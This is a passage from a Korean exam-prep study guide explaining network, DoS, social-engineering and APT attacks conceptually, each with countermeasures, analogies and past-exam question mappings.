| 가짜 Wi-Fi AP | 합법 AP와 같은 이름의 무선 공유기를 띄워 피해자가 자동으로 접속하게 유인 (Evil Twin) |
| SSL Stripping | HTTPS 연결을 HTTP로 강제 다운그레이드해 암호화되지 않은 평문을 가로챔 |

대응책은 다음과 같다.

- **HTTPS/TLS 사용**: 채널 자체를 암호화해 중간에서 읽어도 내용을 알 수 없게 함
- **서버 인증서 검증**: 신뢰된 CA의 인증서만 받아 공격자가 가짜 서버로 위장하지 못하게 함
- **VPN 사용**: 공용 Wi-Fi 환경에서 터널 암호화로 MITM 무력화
- **HSTS(HTTP Strict Transport Security)**: 브라우저가 항상 HTTPS로만 접속하게 강제해 SSL Stripping 방어

스니핑과 MITM을 한 줄로 가르면 이렇다. 스니핑은 '엿보기만' 하는 수동적 공격이고, MITM은 '엿보고 변조까지' 하는 능동적 공격이다. 그리고 ARP 스푸핑은 MITM을 실현하는 '수단'이고, MITM은 그 결과로 얻는 '공격 지위'다.

### 이외 네트워크 공격

#### ICMP Redirect 공격
ICMP 프로토콜은 네트워크 오류를 보고하거나 상태를 진단하는 데 쓴다. 그중 ICMP Redirect 메시지는 라우터가 "더 효율적인 경로가 있으니 다음부터는 이쪽으로 가라"고 알려 주는 메시지다. 공격자는 이 메시지를 위조해서 피해자의 데이터 패킷이 자기 컴퓨터를 거쳐 가도록 경로를 바꾸고, 통신 내용을 엿본다.

#### 세션 하이재킹 (Session Hijacking)
'세션을 가로채다'라는 뜻으로, 정상 연결을 RST 패킷으로 끊은 다음 다시 연결될 때 희생자가 아닌 공격자에게 연결되게 만드는 공격 기법이다. 세션 관리 취약점을 이용하는 공격인데, TCP 세션 하이재킹이라면 3-way handshake가 끝난 뒤에 공격자가 정상 세션을 가로채 인증 없이 통신을 빼앗는다.

- 원리: 정상 세션을 가로채 공격자가 인증된 사용자로 위장
- 특징: 인증 우회, 기존 세션 악용
- 대응책: 세션 토큰 암호화, 세션 타임아웃 설정, HTTPS 사용

#### 재전송 공격 (Replay Attack)
네트워크에서 정상적인 인증·요청 패킷을 가로챘다가, 나중에 같은 패킷을 그대로 다시 보내 피해자로 위장하거나 같은 요청을 반복 실행시키는 공격이다.

- 원리: 패킷 내용을 해독할 필요 없이 가로챈 원본을 그대로 서버에 다시 보내기만 하면 됨
- 예시: A가 은행에 보낸 "100만 원 이체" 요청 패킷을 공격자가 가로챘다가 나중에 그대로 재전송, 같은 이체가 중복 발생
- 세션 하이재킹과의 차이: 세션 하이재킹은 활성 세션 자체를 가로채 공격자 쪽 통신으로 바꿔치기, 재전송 공격은 과거 패킷을 단순히 복제해 재전송

대응책은 넷이다.

- **타임스탬프(Timestamp)**: 패킷에 발생 시각을 넣어 유효 시간이 지난 재전송 거부
- **Nonce(Number used once)**: 요청마다 서버가 1회용 난수를 발급, 같은 값이 두 번 오면 거부
- **시퀀스 번호**: 패킷마다 일련번호를 붙여 중복이나 역순 수신 차단
- **세션 키 / OTP**: 1회용 키로 통신해 재사용을 원천 차단

이 가운데 타임스탬프·Nonce·시퀀스 번호는 재전송 공격 방지 3종 세트로 묶어 외워 둔다. 재전송을 막는 대표 프로토콜로는 IPsec이 시험에 자주 나온다.

## DoS 공격 (Land·Smurf·SYN Flooding·Teardrop)
출제: 25-2, 24-3, 20-1
형태: 공격 원리 설명 2~3줄 → 6개 안팎 보기에서 하나(영문)

### 개념
**서비스 거부(Denial of Service, DoS) 공격**이란 시스템 리소스를 과도하게 써 버려서 정상 사용자가 서비스를 이용하지 못하게 만드는 공격이다. 공격자 한 명이 대상 서버에 요청을 대량으로 보내거나, 시스템 취약점을 이용해 리소스를 고갈시키는 식으로 이루어진다.

예를 들어 어떤 웹사이트에 접속 요청을 엄청나게 보내 서버 처리 용량을 넘기면, 다른 사용자들은 그 사이트에 들어갈 수 없게 된다. 한 사람이 상점 문을 막고 서서 다른 손님이 못 들어가게 하는 것과 같다.

이 기본형에 '분산'이 붙으면 갈래가 둘 더 생긴다.

| 구분 | 공격 종류 |
|---|---|
| 기본 | DoS (서비스 거부) |
| 분산 | DDoS (분산 서비스 거부), DRDoS (분산 반사 서비스 거부) |

### DoS와 DDoS의 차이
DoS가 시스템 하나에서 공격하는 것과 달리, **분산 서비스 거부(Distributed Denial of Service, DDoS)** 공격은 여러 곳에 흩어진 다수의 시스템을 이용한다. 공격자는 악성코드에 감염된 여러 컴퓨터(좀비 PC)를 조종해 특정 목표를 동시에 공격하게 한다. 그래서 공격 규모가 훨씬 커지고, 공격이 어디서 오는지 파악하기도 매우 어려워진다.

| 구분 | DoS (서비스 거부) | DDoS (분산 서비스 거부) |
|---|---|---|
| 공격 주체 | 단일 시스템 | 다수의 분산된 시스템 (좀비 PC) |
| 공격 규모 | 상대적으로 작음 | 매우 큼 |
| 방어 난이도 | 비교적 쉬움 (공격 IP 차단) | 매우 어려움 (공격 IP가 다양함) |

### DRDoS (Distributed Reflection DoS)
**분산 반사 서비스 거부(Distributed Reflection Denial of Service, DRDoS)**는 DDoS의 변종인데, 공격을 증폭시킨다는 특징이 있다. 공격자가 목표를 직접 치는 대신 정상 서비스를 제공하는 제3의 시스템(반사체, Reflector)을 끌어들인다. 공격 과정은 이렇다.

1. **IP 스푸핑(IP 주소 위조)**: 출발지 IP 주소를 공격 대상의 IP로 위조해 다수의 반사체 서버(예: DNS, NTP 서버)에 요청 전송
2. **요청 및 응답**: 반사체 서버들이 위조된 출발지 IP, 곧 공격 대상에게 응답 전송
3. **증폭(Amplification)**: 요청보다 응답이 훨씬 큰 서비스를 이용해 공격 증폭. 예를 들어 작은 DNS 쿼리로 매우 큰 DNS 레코드 응답을 유도해, 공격 대상에게 수십·수백 배 불어난 트래픽 전달

공격자는 자기 IP를 숨길 수 있고 적은 자원으로 큰 효과를 낼 수 있어서, DRDoS는 매우 위협적인 공격 방식이다.

### DoS 공격 종류
대표적인 DoS 공격 여섯 가지의 키워드와 원리를 비유와 함께 정리하면 이렇다.

| 용어 | 키워드 |
|---|---|
| 랜드 어택(LAND Attack) | 자기 자신에게 보내는 편지, 출발지와 목적지 주소 동일, 서비스 거부 |
| 스머프 어택(Smurf Attack) | 출발지 주소 변조, ICMP Echo 패킷, 브로드캐스팅, 타깃 시스템 마비 |
| 티어드롭(Tear Drop) | 깨진 데이터 조각, IP Fragment, 조립 과정에서 오류 발생 |
| 죽음의 핑(Ping of Death) | 과도하게 큰 ICMP 패킷, 버퍼 오버플로우, 시스템 크래시 |
| SYN 플러딩(SYN Flooding) | 3-way handshake 미완료, SYN 패킷만 전송, 연결 테이블 고갈 |
| UDP 플러딩(UDP Flooding) | UDP 패킷 대량 전송, 응답 불가능한 서비스, 대역폭 고갈 |

| 공격 이름 | 원리 | 간단한 비유 |
|---|---|---|
| 랜드 어택 | 자기 자신에게 보내는 편지 | 내가 나에게 계속 전화를 걸어 통화 중으로 만드는 상황 |
| 스머프 어택 | 남의 이름을 외쳐서 혼란 유발 | 방송실에서 "A에게 모두 달려가세요"라고 외쳐 A를 곤란하게 만들기 |
| 티어드롭 | 깨진 장난감 조각 | 장난감(데이터)을 일부러 부서진 조각으로 보내 조립하는 쪽을 고장 내기 |
| 죽음의 핑 | 너무 큰 선물 상자 | 아주 작은 문에 집채만 한 선물 상자를 억지로 밀어 넣어 문을 부수는 상황 |
| SYN 플러딩 | "똑똑" 하고 도망가는 장난전화 | 계속 초인종만 누르고(SYN) 대답하면(ACK) 도망가서 집주인이 계속 문을 열어 두게 만들기 |
| UDP 플러딩 | 모든 집에 무작정 전단지 돌리기 | 아파트 모든 집 초인종을 누르고(UDP) "여기 사는 사람 없나요?"라고 묻게 해 경비실(서버)을 지치게 하기 |

#### 1. 랜드 어택 (LAND Attack)
출발지 IP 주소와 목적지 IP 주소를 둘 다 공격 대상의 IP로 설정해서 패킷을 보내는 공격이다. 그러면 시스템은 자기 자신에게 응답을 보내야 하는 무한 루프에 빠지고, 리소스를 다 써 버려서 다운된다.

#### 2. 스머프 (Smurf)
스머프(스머핑, Smurfing) 공격은 출발지 IP를 공격 대상의 IP로 위조한 다음, 네트워크 안의 모든 장치(브로드캐스트 주소)에 ICMP Echo 요청을 보내는 방식이다. 네트워크의 장치들은 모두 위조된 IP 주소, 곧 공격 대상에게 일제히 응답하고, 그 대량 트래픽에 시스템이 마비된다. 이 공격은 DRDoS의 일종으로도 볼 수 있다.

이름은 만화 "개구쟁이 스머프"에서 왔다. 작지만 수가 많은 스머프들이 네트워크에 연결된 수많은 장치(PC, 프린터 등)이고, 이 장치들이 한 피해자에게 일제히 응답을 보내는 모습이 스머프들이 가가멜 하나를 향해 우르르 달려드는 모습과 같다고 해서 붙은 이름이다.

#### 3. 티어드롭 (Tear Drop)
데이터는 네트워크로 전송될 때 작은 조각(Fragment) 여러 개로 나뉘었다가 목적지에서 다시 조립된다. 티어드롭은 이 재조립 과정의 취약점을 노린다. 공격자가 일부러 조각 순서를 뒤섞거나 일부를 빼고 보내면, 받는 시스템은 조각을 다시 맞추다가 과부하나 오류가 나서 다운된다.

#### 4. 죽음의 핑 (Ping of Death)
ICMP 패킷의 최대 크기(65,535바이트)를 넘는 아주 큰 패킷을 일부러 만들어 보내는 공격이다. 예전 운영체제들은 이렇게 비정상적으로 큰 패킷을 처리하지 못하고 시스템 충돌을 일으켰다. 지금 시스템은 대부분 방어책을 갖추고 있다.

#### 5. SYN 플러딩 (SYN Flooding)
TCP 연결 과정인 3-way-handshake의 취약점을 이용한다. 공격자는 SYN(연결 요청) 패킷을 잔뜩 보내 놓고, 그다음 ACK(응답) 패킷은 보내지 않는다. 서버는 SYN 요청마다 리소스를 할당하고 응답을 기다리는 'SYN-RECEIVED' 상태로 머문다. 이렇게 반쯤 열린(Half-Open) 연결이 쌓이면 서버의 연결 테이블이 가득 차서 새 연결을 더 받을 수 없게 된다.

여기서 SYN은 'Synchronize'(동기화하다)의 약자다. TCP 통신에서 데이터를 주고받기 전에 "우리 이제 통신 시작할까요? 준비됐나요?" 하고 가장 먼저 보내는 첫인사 같은 신호다. 이 신호에는 "내가 보낼 데이터는 이 번호부터 시작할게"라는 순서 번호(Sequence Number)가 담겨 있다. 그러니까 SYN은 통신 시작을 알리면서, 데이터를 순서대로 주고받으려고 서로의 시작 번호를 동기화(Synchronize)하는 역할을 한다.

#### 6. UDP 플러딩 (UDP Flooding)
UDP는 TCP와 달리 연결 설정 과정이 없는 비연결성 프로토콜이다. UDP 플러딩은 이 특징을 악용해 UDP 패킷을 특정 포트로 대량·무작위로 보내는 공격이다. 서버는 그 포트에서 실행 중인 애플리케이션이 있는지 확인하고, 없으면 ICMP "Destination Unreachable" 메시지로 응답한다. 이 과정이 되풀이되면서 서버 리소스가 바닥나 정상 요청을 처리하지 못하게 된다.

### 기출에서 이렇게 나왔다
- 25-2: 3-way handshake·SYN 다량·ACK 안 보냄 → **SYN Flooding**
- 24-3: 출발지 변조·ICMP Echo 브로드캐스팅 → **Smurf**
- 20-1: 출발지·목적지 IP를 대상 IP로 동일하게 → **Land Attack**

### 답 쓸 때
답은 보기에 있는 영문을 그대로 옮겨 쓴다. 아마 가장 헷갈리는 게 ICMP가 나오는 지문일 텐데, ICMP가 보이면 "브로드캐스트"가 있을 때 Smurf, "크기"가 있을 때 Ping of Death다. 둘 다 없이 Echo 요청을 다량으로 보내기만 하면 Ping Flood다. "분할·재조립"이 보이면 Teardrop이다.

## 사회공학·표적 공격·APT (Watering Hole·피싱·BEC)
출제: 26-1, 24-1, 22-3, 22-1
형태: 설명 2~4줄 → 용어. Watering Hole·APT는 보기(영문), 사회공학은 직접 쓰기

### 개념
**사회공학(Social Engineering)** 공격이란 시스템의 기술적 결함이 아니라 사람의 심리와 신뢰를 이용해 정보를 빼내거나 악성코드에 감염시키는 공격을 말한다. 방화벽·암호화 같은 기술 보안이 아무리 강해도, 사용자가 속아서 직접 ID·비밀번호를 입력하거나 첨부파일을 여는 순간 뚫린다.

대표 경로는 이메일·SMS·전화·가짜 웹사이트처럼 사용자가 평소에 믿는 채널이고, 공격자는 긴급함·권위·호기심 같은 감정을 건드려 판단을 흐리게 만든다.

이 묶음은 불특정 다수를 노리는 사회공학 공격(피싱, 파밍, 스미싱, 비싱, Drive-by Download)과 Cyber Kill Chain 7단계를 먼저 보고, 이어서 특정 대상을 노리는 표적 공격(Business Scam, 워터링 홀)과 APT를 본다.

### 주요 사회공학 공격 비교표
아래 표는 불특정 다수를 노리는 공격 위주다. 스피어 피싱은 피싱 가족의 표적형 변종이라 피싱의 확장으로 함께 두지만, 본질은 표적 공격이다.

| 공격 기법 | 전달 수단 | 대상 | 핵심 키워드 |
|---|---|---|---|
| 피싱 (Phishing) | 이메일·메신저 | 불특정 다수 | 가짜 사이트, ID·비밀번호 탈취 |
| 파밍 (Pharming) | DNS·hosts 파일 조작 | 불특정 다수 | 정상 URL 입력해도 가짜 사이트로 이동 |
| 스미싱 (Smishing) | SMS 문자 | 불특정 다수 | SMS + 피싱, 악성 링크 |
| 비싱 (Vishing) | 전화 통화 | 불특정 다수 | Voice + 피싱, 금융사 사칭 |
| Drive-by Download | 감염된 웹페이지 | 불특정 다수 | 방문만 해도 자동 다운로드·실행 |
| 스피어 피싱 (Spear Phishing) | 맞춤형 이메일 | 특정 개인·조직 | 사전 정찰, 표적 맞춤 미끼 (피싱의 표적형 변종) |

### 피싱, 파밍, 스미싱, 비싱
파밍·스미싱·비싱은 결국 피싱의 변형이다. "사칭해서 속여 정보를 빼낸다"는 피싱이 큰 뿌리이고, 무엇으로 전달하느냐에 따라 이름이 갈린다.

- **피싱(Phishing)**: 이메일·가짜 웹사이트 (원형)
- **파밍(Pharming)**: DNS·hosts 파일 조작 (URL은 정상이어도 가짜 사이트로 이동)
- **스미싱(Smishing)**: SMS + Phishing
- **비싱(Vishing)**: Voice + Phishing

전달 수단만 다를 뿐 목적(정보 탈취)과 원리(신뢰 채널 사칭)는 같다. 그래서 넷을 한 묶음으로 익혀 두면 시험에 어떤 이름이 나와도 "피싱 계열이구나" 하고 맥락을 잡을 수 있다.

#### 1. 피싱 (Phishing)
"Private data + Fishing"의 합성어다. 공격자가 은행·포털·택배사 등을 사칭해 가짜 이메일·메시지를 보내고, 피해자가 그 안의 링크를 눌러 가짜 사이트에 ID·비밀번호·카드번호를 입력하게 만든다.

- 원리: 진짜와 똑같이 생긴 가짜 사이트로 유인 → 입력된 정보 탈취
- 특징: 이메일 발신 주소·URL 도메인을 자세히 보면 미묘하게 다름 (예: naver.com → nayer.com)
- 대응책: 링크를 바로 누르지 말고 주소창에 직접 입력, 2단계 인증 활성화

#### 2. 파밍 (Pharming)
결과는 피싱과 같지만, 피해자가 정상 URL을 입력해도 가짜 사이트로 접속되는 더 강력한 공격이다. 공격자는 DNS 서버나 피해자 PC의 hosts 파일을 변조해 도메인 → IP 매핑을 바꿔 버린다. 여기서 hosts 파일은 OS가 DNS 서버에 묻기 전에 먼저 보는 로컬 도메인→IP 매핑 파일로, Windows는 `C:\Windows\System32\drivers\etc\hosts`, 리눅스·macOS는 `/etc/hosts`에 있다.

- 원리: DNS 변조·hosts 파일 변조 → 주소창이 bank.com이어도 실제로는 공격자 서버에 접속
- 특징: 사용자가 URL을 아무리 꼼꼼히 확인해도 소용없음 (Phishing + Farming의 합성어)
- 대응책: DNSSEC, HTTPS 인증서 경고 무시 금지, 안티바이러스로 hosts 파일 변조 탐지

```mermaid
제목: 파밍은 도로 표지판(DNS·hosts)을 바꿔치기해 정상 주소를 입력해도 가짜 은행으로 보낸다
flowchart LR
  U("피해자: bank.com 입력") --> S{"DNS / hosts<br>(공격자가 조작)"}
  S -.->|"원래 가야 할 길"| R("진짜 은행")
  S ==>|"바뀐 길"| F("가짜 은행")
```

그런데 왜 이름에 Farming(농사)이 들어갔을까? 피싱은 한 사람씩 낚시(fishing)로 낚는 방식이다. 반면 파밍은 DNS 서버나 hosts 파일을 한 번만 조작해 두면 그 서버·PC를 쓰는 모든 사용자가 자동으로 가짜 사이트에 접속된다. 씨앗(가짜 DNS 매핑)을 한 번 뿌려 두고 자라난 수확물(피해자 정보)을 한꺼번에 거둬들이는 모습이 농사와 닮아서 붙은 이름이다. 낚시보다 더 대량·자동화된 수확 방식이라는 뉘앙스다.

#### 3. 스미싱 (Smishing)
"SMS + Phishing"이다. SMS 문자에 악성 링크나 악성 앱 APK 다운로드 링크를 넣어 스마트폰 사용자를 공격한다. "택배 조회", "건강검진 결과"처럼 평범한 내용으로 클릭을 유도한다.

#### 4. 비싱 (Vishing)
"Voice + Phishing"이다. 음성 전화로 금융감독원·경찰·자녀 등을 사칭해 비밀번호·OTP·인증번호를 불러 달라고 요구한다. 국내에서는 흔히 보이스피싱이라고 부른다.

### 스피어 피싱 (Spear Phishing)
일반 피싱이 그물로 불특정 다수를 노린다면, 스피어 피싱은 특정 개인·부서·기업을 미리 정찰한 뒤 그 정보에 맞춘 맞춤형 피싱 메일을 보내는 공격이다. 이름처럼 작살(spear)로 특정 물고기 한 마리만 찌르는 방식이라 표적형 변종으로 분류되지만, 피싱 가족의 확장이라 여기서 함께 본다.

- 원리: SNS·회사 홈페이지·LinkedIn 등에서 표적의 이름·직책·진행 프로젝트·거래처 정보 수집 → "담당 프로젝트 보고서.pdf", "인사팀 ○○○ 과장님께 전달 요청"처럼 표적이 의심하기 어려운 맞춤 미끼로 메일 발송 → 한 명이 열면 성공

```steps
제목: 사전 정찰로 얻은 정보를 미끼에 새겨 한 명만 정확히 찌른다
사전 정찰 | 이름·직책·프로젝트 수집
맞춤 미끼 | 표적에 맞춘 메일
한 명 감염 | 열면 성공
```

일반 피싱과 비교하면 이렇다.

| 구분 | 일반 피싱 | 스피어 피싱 |
|---|---|---|
| 표적 | 불특정 다수 | 특정 개인·부서·기업 |
| 발송량 | 대량 | 소수 맞춤 |
| 내용 | 범용 ("계정 만료", "택배 조회") | 표적의 이름·직책·프로젝트 반영 |
| 탐지 | 스팸 필터로 상당수 차단 | 개인화되어 정상 메일처럼 보여 탐지 어려움 |
| 성공률 | 낮음 | 매우 높음 |

주요 변종은 둘이다.

- **웨일링(Whaling)**: CEO·CFO 같은 고위 임원을 노리는 스피어 피싱. "큰 물고기(whale)" 비유. 송금 권한이 있는 임원을 속여 거액 피해 유발
- **클론 피싱(Clone Phishing)**: 피해자가 예전에 받은 정상 메일을 복제해 링크·첨부만 악성으로 교체. "방금 보낸 메일에 파일을 빠뜨려 다시 보냅니다" 식으로 유인

스피어 피싱은 APT의 대표 침투 수단이기도 하다. APT 공격자는 표적 기업 임원·담당자의 SNS를 몇 주 동안 수집한 뒤 '담당 프로젝트 보고서.pdf' 같은 맞춤 미끼로 메일을 보낸다. 사전 정찰 → 맞춤 미끼 → 한 명 감염이라는 경로가 아래에서 볼 APT의 1단계(침투)와 정확히 맞물린다.

- 대응책: 메일 속 링크에 마우스를 올려(hover) 실제 URL 확인, 첨부파일 샌드박스 스캔, 의심되면 전화·메신저 등 다른 채널로 발신자 재확인, DMARC·SPF·DKIM 이메일 인증 엄격 적용, 임직원 정기 모의 훈련

여기 나온 SPF·DKIM·DMARC는 이메일 발신 도메인을 검증해 사칭 메일을 걸러내는 이메일 인증 표준이다. SPF는 발신 서버 IP 허용 목록, DKIM은 전자서명, DMARC는 두 결과를 바탕으로 수신 정책을 정한다.

### Drive-by Download
사용자가 웹페이지를 방문하기만 해도 본인도 모르게 악성코드가 자동으로 다운로드·실행되는 공격이다. 다운로드 링크를 누르거나 첨부파일을 열 필요조차 없어서 더 은밀하다.

- 원리: 브라우저·플러그인(Flash·Java·PDF Reader 등) 취약점을 악용해 방문만으로 파일 다운로드·실행
- 특징: 불특정 다수 대상. 클릭·다운로드 버튼을 누를 필요가 없어 피해자가 감염 사실을 알아채기 어려움
- 대응책: 브라우저·플러그인 자동 업데이트, 브라우저 샌드박스 활용, 알 수 없는 사이트 접속 주의

### Cyber Kill Chain 7단계
**Cyber Kill Chain**은 록히드마틴(Lockheed Martin)이 군사 작전의 Kill Chain 개념을 사이버 공격에 적용해 내놓은 공격 단계 모델이다. 공격자가 목적을 이루기까지 밟는 7단계를 정의해 두고, 방어자가 각 단계에서 공격을 끊을 수 있게 돕는다. 단 한 고리만 끊어도 전체 공격이 무너진다는 발상이다.

| 단계 | 영문 | 설명 |
|---|---|---|
| 1 | Reconnaissance (정찰) | 표적 정보 수집 (공개 정보·SNS·이메일 주소 등) |
| 2 | Weaponization (무기화) | 악성코드와 전달 수단 결합 (예: 악성 매크로 + 워드 파일) |
| 3 | Delivery (전달) | 이메일·USB·워터링 홀 등으로 표적에 전달 |
| 4 | Exploitation (악용) | 취약점을 이용해 실행 |
| 5 | Installation (설치) | 백도어·드로퍼 설치로 지속성 확보 |
| 6 | Command & Control (C2) | 공격자 서버와 원격 통신 채널 구축 |
| 7 | Actions on Objectives (목적 달성) | 데이터 유출·랜섬웨어 실행·시스템 파괴 등 |

3단계 Delivery(전달)에는 피싱·Business Scam 같은 사회공학 메일뿐 아니라 워터링 홀 같은 표적 웹 공격도 전달 경로로 쓰일 수 있다. 그래서 방어자는 이메일 게이트웨이·웹 필터·사용자 교육을 경로마다 맞게 적용해야 한다.

### 표적 공격
표적 이메일 사기는 기업 담당자나 거래처 같은 특정 대상을 조사한 뒤, 믿을 만한 발신자인 척 속여 송금을 유도하는 사회공학 공격이다. 워터링 홀도 특정 집단을 노리지만 사람에게 사칭 메일을 보내지는 않는다. 표적이 찾는 웹사이트를 감염시키는 방식이다.

#### Business Scam (BEC, Business Email Compromise)
**Business Scam**은 기업의 재무·구매 담당자를 노린 사칭 이메일 공격이다. 공격자는 CEO·CFO·거래처 담당자를 사칭해 "긴급히 송금을 처리해 달라"는 메일을 보내고, 피해 기업이 공격자 계좌로 대금을 보내게 만든다.

영어권에서는 **BEC(Business Email Compromise)**라고 부른다. Compromise가 "침해·장악"이라는 뜻이라, 직역하면 "업무 이메일 계정 침해"다. 임원·거래처의 이메일 계정을 실제로 빼앗거나 거의 똑같이 생긴 유사 도메인을 써서 이메일에 대한 신뢰 자체를 무너뜨린다는 뉘앙스가 담겨 있다. 국내에서는 흔히 스캠 메일 또는 비즈니스 이메일 사기라고 하고, 시험에는 Business Scam과 BEC 두 표현이 모두 나올 수 있다.

```mermaid
제목: CEO 가면 뒤의 공격자가 재무 담당자에게 송금을 시킨다
flowchart LR
  A("공격자<br>(CEO 사칭)") -->|"'긴급 송금' 메일"| B("재무 담당자") -->|"송금"| C("공격자 계좌")
```

- 원리: 임원·거래처 이메일 계정 탈취 또는 유사 도메인 사용(예: `example.com` → `exampIe.com`, 소문자 l을 대문자 I로 교체) → 송금 요청
- 특징: 개인이 아닌 기업이 표적. 한 건당 피해가 수천만 원~수억 원 단위
- 대응책: 송금 전 전화·대면으로 이중 확인, 이메일 도메인 정밀 검사, DMARC/SPF/DKIM 이메일 인증 적용

#### 워터링 홀 (Watering Hole)
**워터링 홀**은 특정 집단이 자주 찾는 웹사이트를 미리 감염시켜 두고, 표적이 평소처럼 방문할 때 악성코드에 노출되게 하는 표적 웹 공격이다. 물웅덩이 옆에서 먹잇감을 기다리는 포식자의 사냥 방식에서 이름을 따왔다.

- 원리: 표적 집단이 찾는 사이트 파악 → 그 사이트 침해 → 방문자의 브라우저 취약점 등을 이용해 악성코드 전달
- 감염 수단: Drive-by Download가 쓰일 수 있음. 워터링 홀은 어디서 표적을 기다리는가, Drive-by Download는 방문자를 어떻게 감염시키는가
- 대응: 브라우저·OS 패치, 웹 접근 통제, 방문 후 이상 행위 탐지

SQL Injection·XSS는 웹 서비스의 입력 처리 결함을 직접 악용하는 공격이다. 워터링 홀에서는 그런 결함이 사이트를 감염시키거나 방문자를 공격하는 수단이 될 수는 있지만, 워터링 홀 자체가 특정 취약점의 이름은 아니다. 그리고 바로 아래 APT는 여러 수단을 쓰는 공격 캠페인이고, 워터링 홀은 그 침투 수단 가운데 하나다.

### APT (지능형 지속 위협)

#### APT (Advanced Persistent Threat)
**APT(Advanced Persistent Threat, 지능형 지속 위협)**는 표적 한 곳을 정해 놓고 수개월~수년에 걸쳐 은밀하게 침투하는 공격이다. 단순 침입이 아니라 제로데이·악성코드·사회공학 등 여러 공격 기법을 조합한다는 것이 특징이다. 불특정 다수에게 대량으로 뿌리는 공격(예: 피싱·랜섬웨어 스캐닝)과 달리 처음부터 끝까지 정해진 한 조직만 노린다.

예를 들어 방산 기업을 노린다면, 인사팀에 "채용 포트폴리오"로 위장한 메일을 보내 직원 한 명을 감염시킨 다음, 3개월 동안 조용히 내부망을 탐색해 설계 도면을 모으고, 업무 시간에 맞춰 조금씩 외부로 빼내는 식이다.

공격 주체는 대개 국가 지원 해커 그룹이나 고도로 조직화된 범죄 집단이다. 기법 하나가 아니라 제로데이·악성코드·사회공학·네트워크 공격을 상황에 맞게 골라 쓰는 "캠페인" 형태인데, 캠페인(Campaign)이란 여러 공격 기법을 묶어 몇 달에 걸쳐 실행하는 장기 공격 프로젝트를 말한다. 선거 캠페인처럼 기간·목표·전략이 정해진 조직적 활동이다.

#### 핵심 3요소 (A·P·T)
APT라는 이름 자체에 핵심 3요소가 들어 있다. 세 축이 모두 맞아야 APT로 분류한다.

| 약자 | 의미 | 핵심 키워드 |
|---|---|---|
| Advanced | 단일 기법이 아닌 제로데이·악성코드·사회공학·네트워크 공격 등 다양한 기술 조합 | "복합 기법", "다양한 보안 위협" |
| Persistent | 한 번에 끝내지 않고 수개월~수년간 은밀히 체류 | "지속적", "장기간" |
| Threat | 불특정 다수가 아닌 특정 표적 한 곳을 노림 | "명확한 표적", "표적 내부 직원" |

셋 중 하나라도 빠지면 일반 공격 캠페인이다. 예를 들어 불특정 다수에게 뿌리는 단일 랜섬웨어는 복합 기법(Advanced)도 표적(Threat)도 없으니 APT가 아니라 일반 사이버 범죄다. 24-1 기출이 바로 이 3요소와 아래 4단계 프로세스를 지문으로 주고 APT를 맞히게 했다.

#### 4단계 공격 프로세스
APT는 보통 침투 → 검색 → 수집 → 유출의 4단계로 실행되고, 단계마다 다른 공격 기술이 섞인다.

| 단계 | 이름 | 무엇을 하는가 | 자주 쓰이는 기술 | 예시 |
|---|---|---|---|---|
| 1 | 침투(Infiltration) | 표적 내부 단말·계정 확보 | 스피어 피싱, 워터링 홀, 제로데이, 공급망 공격 | 인사팀 직원에게 입사 지원서 위장 첨부파일 메일 발송 → 1명 감염 |
| 2 | 검색(Discovery) | 내부망 구조·권한·핵심 자산 위치 파악 | 내부 스캐닝, 계정 탈취, 권한 상승 | 감염된 PC에서 파일 서버·DB 서버 IP 목록 수집, 관리자 계정 탐색 |
| 3 | 수집(Collection) | 목표 데이터를 모아 정리 | 키로거, 스크린 캡처, 문서 수집 도구 | 설계 도면·연구 문서를 암호화 압축 파일로 묶어 임시 폴더에 대기 |
| 4 | 유출(Exfiltration) | 모은 데이터를 외부로 빼냄 | C2 서버 경유 암호화 전송, DNS 터널링 | 업무 시간(낮 9시~6시)에 소량씩 HTTPS로 외부 서버에 전송 |

표에 나온 용어를 짚고 가면, 키로거(Keylogger)는 키보드 입력을 가로채 기록하는 악성 프로그램으로 수집 단계에서 계정 정보·문서 내용을 빼내는 데 자주 쓰인다. C2(Command and Control)는 공격자가 감염된 단말을 원격으로 조종하고 명령을 내리는 공격용 서버다. DNS 터널링(DNS Tunneling)은 데이터를 DNS 질의·응답 패킷에 숨겨 밖으로 빼내는 기법인데, 대부분의 방화벽이 DNS 트래픽을 막지 않아서 은밀한 유출 경로가 된다.

단계마다 몇 주에서 몇 달씩 머물기도 하고, 들키지 않는 것이 최우선 목표다. 방어자가 알아채기 어려운 이유는 단계마다 오가는 네트워크 트래픽(네트워크를 오가는 데이터 흐름)이 정상 업무 트래픽(이메일 송수신, 파일 다운로드처럼 평소 업무 중에 생기는 통신)과 비슷하게 위장되기 때문이다. 업무 시간대에만 소량씩 HTTPS로 데이터를 내보내면 방화벽·로그 모니터링에 걸리지 않는다.

```steps
제목: 수개월에 걸쳐 조용히 진행되는 4단계 (정상 업무 트래픽으로 위장)
1. 침투 | 인사팀 위장 메일 (1주일)
2. 검색 | 내부망 스캔 (수 주)
3. 수집 | 키로거로 수집 (수개월)
4. 유출 | 9~18시 HTTPS 소량 전송 (은밀 전송)
```

시험 포인트는 이 순서다. 침투 → 검색 → 수집 → 유출을 외워 두고, 24-1처럼 "일반적으로 4단계로 실행되며"라는 지문이 나오면 답은 APT다.

#### 일반 공격 vs APT

| 구분 | 일반 공격 (예: 무작위 IP에 랜섬웨어 뿌리기) | APT |
|---|---|---|
| 표적 | 불특정 다수 | 특정 조직·기업 한 곳 |
| 기간 | 수 시간~며칠 | 수개월~수년 |
| 기술 | 단일 기법 반복 | 제로데이·악성코드·사회공학·네트워크 공격 결합 |
| 목적 | 즉각적 금전 이득 | 기밀 정보 탈취·국가 인프라 교란 |
| 주체 | 개인 해커·범죄 그룹 | 국가 지원 그룹·고도 조직 |

그물로 떼를 노리는 어부와 한 곳을 오래 조준하는 저격수의 차이라고 보면 된다.

#### 주요 침투 수단
4단계 중 1단계(침투)에 쓰이는 수단을 자세히 보면, APT는 여러 경로를 조합한다. 각 수단은 다른 묶음에서 자세히 다루고, 여기서는 APT 안에서의 역할만 정리한다.

- **워터링 홀**: 표적 집단이 자주 찾는 사이트에 악성코드를 심어 두고 기다림
- **스피어 피싱(Spear Phishing)**: 표적 개인의 직책·관심사를 반영한 맞춤형 피싱 메일
- **제로데이 취약점**: 패치가 없는 취약점을 이용해 탐지 회피
- **공급망 공격(Supply Chain Attack)**: 표적이 쓰는 소프트웨어 제작사나 협력사를 먼저 침해, 표적이 "정상 업데이트"를 받는 순간 감염. SolarWinds 사건이 대표 사례
